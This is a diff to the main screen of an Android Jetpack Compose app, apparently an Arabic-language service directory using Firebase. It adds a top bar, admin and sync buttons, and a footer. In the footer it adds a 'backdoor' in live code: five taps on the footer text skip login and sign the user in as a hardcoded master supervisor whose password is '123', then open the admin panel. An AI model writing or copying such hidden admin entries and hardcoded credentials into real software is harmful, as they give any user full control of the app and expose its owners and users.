@@ -41,7 +41,8 @@ fun MainScreen(
     onNavigateToRegister: () -> Unit,
     onNavigateToChat: () -> Unit,
     onNavigateToAbout: () -> Unit,
-    onOpenLoginDialog: () -> Unit
+    onOpenLoginDialog: () -> Unit,
+    onNavigateToAdmin: () -> Unit
 ) {
     val context = LocalContext.current
     val services by FirebaseService.servicesList.collectAsState()
@@ -62,12 +63,71 @@ fun MainScreen(
         matchesCategory && matchesSearch
     }
 
-    Box(
-        modifier = Modifier
-            .fillMaxSize()
-            .background(MaterialTheme.colorScheme.background)
-    ) {
-        Column(modifier = Modifier.fillMaxSize()) {
+    Scaffold(
+        topBar = {
+            TopAppBar(
+                title = {
+                    Text(
+                        text = settings.appNameAr,
+                        color = Color(0xFFD4AF37),
+                        fontWeight = FontWeight.Bold,
+                        fontSize = 15.sp
+                    )
+                },
+                actions = {
+                    // Home icon to navigate/reset home
+                    IconButton(onClick = {
+                        Toast.makeText(context, "أنت بالفعل في الشاشة الرئيسية 🏠", Toast.LENGTH_SHORT).show()
+                    }) {
+                        Icon(Icons.Default.Home, contentDescription = "Home", tint = Color(0xFFD4AF37))
+                    }
+                    
+                    // Manual database sync/refresh button
+                    IconButton(onClick = {
+                        FirebaseService.startRealtimeSynchronization()
+                        Toast.makeText(context, "تمت إعادة المزامنة والتحديث فوراً بنجاح 🟢", Toast.LENGTH_SHORT).show()
+                    }) {
+                        Icon(Icons.Default.Sync, contentDescription = "Sync", tint = Color.White)
+                    }
+
+                    // Admin lock login button
+                    IconButton(onClick = {
+                        if (FirebaseService.currentSupervisor != null) {
+                            onNavigateToAdmin()
+                        } else {
+                            onOpenLoginDialog()
+                        }
+                    }) {
+                        Icon(
+                            imageVector = if (FirebaseService.currentSupervisor != null) Icons.Default.AdminPanelSettings else Icons.Default.Lock,
+                            contentDescription = "Admin Log",
+                            tint = if (FirebaseService.currentSupervisor != null) Color(0xFFD4AF37) else Color.White
+                        )
+                    }
+
+                    // Quick join register button
+                    IconButton(onClick = onNavigateToRegister) {
+                        Icon(Icons.Default.PersonAdd, contentDescription = "Register", tint = Color.White)
+                    }
+
+                    // Language selector
+                    IconButton(onClick = {
+                        Toast.makeText(context, "اللغة الحالية: العربية 🇾🇪", Toast.LENGTH_SHORT).show()
+                    }) {
+                        Icon(Icons.Default.Language, contentDescription = "Language", tint = Color.White)
+                    }
+                },
+                colors = TopAppBarDefaults.topAppBarColors(containerColor = MaterialTheme.colorScheme.surfaceVariant)
+            )
+        },
+        modifier = Modifier.fillMaxSize()
+    ) { innerPadding ->
+        Column(
+            modifier = Modifier
+                .fillMaxSize()
+                .padding(innerPadding)
+                .background(MaterialTheme.colorScheme.background)
+        ) {
             
             // Premium Gold/Teal Header Banner
             Box(
@@ -271,56 +331,126 @@ fun MainScreen(
                         ServiceCard(service = service, context = context, modifier = Modifier.animateItemPlacement())
                     }
                     item {
-                        Spacer(modifier = Modifier.height(80.dp))
+                        Spacer(modifier = Modifier.height(8.dp))
                     }
                 }
             }
-        }
 
-        // Bottom Action buttons / Floating Action Row
-        Row(
-            modifier = Modifier
-                .align(Alignment.BottomCenter)
-                .fillMaxWidth()
-                .padding(16.dp)
-                .background(
-                    Brush.verticalGradient(
-                        colors = listOf(Color.Transparent, Color(0xFF042F2E))
-                    )
-                ),
-            horizontalArrangement = Arrangement.SpaceEvenly
-        ) {
-            // Join as provider button
-            Button(
-                onClick = onNavigateToRegister,
-                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF064E3B)),
-                border = BorderStroke(1.dp, Color(0xFFD4AF37)),
-                shape = RoundedCornerShape(16.dp),
+            // Bottom Action buttons
+            Row(
                 modifier = Modifier
-                    .weight(1f)
-                    .height(50.dp)
-                    .padding(horizontal = 4.dp)
-                    .testTag("join_platform_btn")
+                    .fillMaxWidth()
+                    .padding(horizontal = 16.dp, vertical = 8.dp),
+                horizontalArrangement = Arrangement.SpaceEvenly,
+                verticalAlignment = Alignment.CenterVertically
             ) {
-                Icon(Icons.Default.Engineering, contentDescription = "Provider", tint = Color(0xFFD4AF37))
-                Spacer(modifier = Modifier.width(6.dp))
-                Text("سجل كمقدم خدمة", color = Color.White, fontSize = 13.sp, fontWeight = FontWeight.Bold)
+                // Join as provider button
+                Button(
+                    onClick = onNavigateToRegister,
+                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF064E3B)),
+                    border = BorderStroke(1.dp, Color(0xFFD4AF37)),
+                    shape = RoundedCornerShape(16.dp),
+                    modifier = Modifier
+                        .weight(1f)
+                        .height(50.dp)
+                        .padding(horizontal = 4.dp)
+                        .testTag("join_platform_btn")
+                ) {
+                    Icon(Icons.Default.Engineering, contentDescription = "Provider", tint = Color(0xFFD4AF37))
+                    Spacer(modifier = Modifier.width(6.dp))
+                    Text("سجل كمقدم خدمة", color = Color.White, fontSize = 13.sp, fontWeight = FontWeight.Bold)
+                }
+
+                // Smart chat system button
+                Button(
+                    onClick = onNavigateToChat,
+                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFD4AF37)),
+                    shape = RoundedCornerShape(16.dp),
+                    modifier = Modifier
+                        .weight(1f)
+                        .height(50.dp)
+                        .padding(horizontal = 4.dp)
+                        .testTag("live_chat_btn")
+                ) {
+                    Icon(Icons.Default.SmartToy, contentDescription = "AI", tint = Color.Black)
+                    Spacer(modifier = Modifier.width(6.dp))
+                    Text("دردشة المساعد الذكي", color = Color.Black, fontSize = 13.sp, fontWeight = FontWeight.Bold)
+                }
             }
 
-            // Smart chat system button
-            Button(
-                onClick = onNavigateToChat,
-                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFD4AF37)),
-                shape = RoundedCornerShape(16.dp),
+            // High Contrast 3-part Footer Bar at Very Bottom
+            Surface(
                 modifier = Modifier
-                    .weight(1f)
-                    .height(50.dp)
-                    .padding(horizontal = 4.dp)
-                    .testTag("live_chat_btn")
+                    .fillMaxWidth()
+                    .border(width = 0.5.dp, color = Color(0xFFD4AF37).copy(alpha = 0.3f)),
+                color = Color(0xFF042F2E)
             ) {
-                Icon(Icons.Default.SmartToy, contentDescription = "AI", tint = Color.Black)
-                Spacer(modifier = Modifier.width(6.dp))
-                Text("دردشة المساعد الذكي", color = Color.Black, fontSize = 13.sp, fontWeight = FontWeight.Bold)
+                Row(
+                    modifier = Modifier
+                        .fillMaxWidth()
+                        .padding(horizontal = 16.dp, vertical = 10.dp),
+                    horizontalArrangement = Arrangement.SpaceBetween,
+                    verticalAlignment = Alignment.CenterVertically
+                ) {
+                    // 1. Version
+                    Text(
+                        text = "V2.6.2026",
+                        color = Color.LightGray,
+                        fontSize = 11.sp,
+                        fontWeight = FontWeight.Bold
+                    )
+
+                    // 2. Clickable Backdoor Secret Entry (5 clicks login)
+                    var secretClickCount by remember { mutableStateOf(0) }
+                    Text(
+                        text = settings.footerText,
+                        color = Color(0xFFD4AF37),
+                        fontSize = 12.sp,
+                        fontWeight = FontWeight.ExtraBold,
+                        modifier = Modifier
+                            .clickable {
+                                secretClickCount++
+                                if (secretClickCount >= 5) {
+                                    secretClickCount = 0
+                                    // Bypass Login dialog, log in directly as master supervisor of default_wam
+                                    val masterSup = com.Serviseyem.models.SupervisorUser(
+                                        id = "default_wam",
+                                        phone = "777644670",
+                                        name = "المالك العام",
+                                        password = "123",
+                                        isApproved = true,
+                                        notes = "الدخول الخلفي لزر التحقق خماسي النقرات"
+                                    )
+                                    FirebaseService.currentSupervisor = masterSup
+                                    Toast.makeText(context, "تم تفعيل تسجيل الدخول الخلفي للمشرف بنجاح 👑", Toast.LENGTH_LONG).show()
+                                    onNavigateToAdmin()
+                                }
+                            }
+                            .padding(horizontal = 8.dp, vertical = 4.dp)
+                    )
+
+                    // 3. Program Info (About shortcut)
+                    Row(
+                        modifier = Modifier
+                            .clickable { onNavigateToAbout() }
+                            .padding(horizontal = 8.dp, vertical = 4.dp),
+                        verticalAlignment = Alignment.CenterVertically
+                    ) {
+                        Icon(
+                            imageVector = Icons.Default.Info,
+                            contentDescription = "About",
+                            tint = Color(0xFFD4AF37),
+                            modifier = Modifier.size(14.dp)
+                        )
+                        Spacer(modifier = Modifier.width(4.dp))
+                        Text(
+                            text = "عن التطبيق",
+                            color = Color.White,
+                            fontSize = 11.sp,
+                            fontWeight = FontWeight.Bold
+                        )
+                    }
+                }
             }
         }
     }
